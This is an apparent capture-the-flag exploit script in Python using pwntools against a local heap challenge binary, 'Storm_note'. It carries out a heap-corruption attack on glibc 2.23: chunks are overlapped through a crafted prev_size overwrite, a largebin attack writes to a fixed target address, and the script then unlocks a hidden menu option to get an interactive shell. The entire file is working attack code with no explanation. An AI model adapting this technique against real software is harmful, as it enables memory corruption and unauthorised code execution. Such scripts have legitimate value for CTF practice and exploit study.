from pwn import *

p = process('./Storm_note')
elf = ELF('./Storm_note')
libc = ELF('./libc-2.23.so')
#max_fast = 

def create(size):
    p.sendlineafter('Choice: ','1')
    p.sendlineafter('size ?\n',str(size))

def edit(index,content):
    p.sendlineafter('Choice: ','2')
    p.sendlineafter('Index ?\n',str(index))
    p.sendafter('Content: \n',content)

def delete(index):
    p.sendlineafter('Choice: ','3')
    p.sendlineafter('Index ?\n',str(index))

def getshell():
    p.sendlineafter('Choice: ','666')
    p.sendlineafter('If you can open the lock, I will let you in','A'*0x30)

create(0x28)  #0
create(0x528) #1
create(0xf8)  #2
create(0x28)  #3
create(0x28)  #4
create(0x518) #5
create(0xf8)  #6
create(0x28)  #7

delete(0)
edit(1,'A'*0x520+p64(0x560))
delete(2)

create(0x38) #0
create(0x610)#2

delete(4)
edit(5,'A'*0x510+p64(0x550))
delete(6)

create(0x38) #4
create(0x600)#6
delete(6)

delete(2)
create(0x610)#2

edit(5,p64(0)+p64(0x611)+p64(0)+p64(0xABCD0100-0x20+8)+p64(0)+p64(0xABCD0100-0x38-5))
delete(2)
edit(1,p64(0)+p64(0x621)+p64(0)+p64(0xABCD0100-0x20))

#gdb.attach(p)
create(0x48)#2
edit(2,p64(0)*2+'A'*0x30)

getshell()

p.interactive()
